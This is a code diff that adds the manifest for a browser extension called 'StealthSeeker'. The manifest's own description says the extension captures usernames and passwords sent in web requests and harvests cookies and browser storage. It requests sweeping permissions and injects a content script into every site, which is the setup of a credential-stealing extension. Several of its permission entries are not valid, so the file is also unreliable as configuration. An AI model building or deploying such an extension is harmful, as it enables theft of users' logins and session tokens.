@@ -1,0 +1,31 @@
+{
+  "name": "StealthSeeker",
+  "version": "1.0",
+  "manifest_version": 2,
+  "description": "Monitors when username and password are sent from web requests, gets the browser's current cookies, Local Storage, Session Storage, IndexedDB and CacheStorage",
+  "background": {
+    "scripts": ["background.js"]
+  },
+  "permissions": [
+    "tabs",
+    "indexedDB",
+    "cacheStorage",
+    "webNavigation",
+    "webRequest",
+    "webRequestBlocking",
+    "<all_urls>",
+    "activeTab",
+    "storage",
+    "identity",
+    "web_accessible_resources",
+    "cookies",
+    "chrome://settings"
+  ],
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["content.js"],
+      "run_at": "document_end"
+    }
+  ]
+}
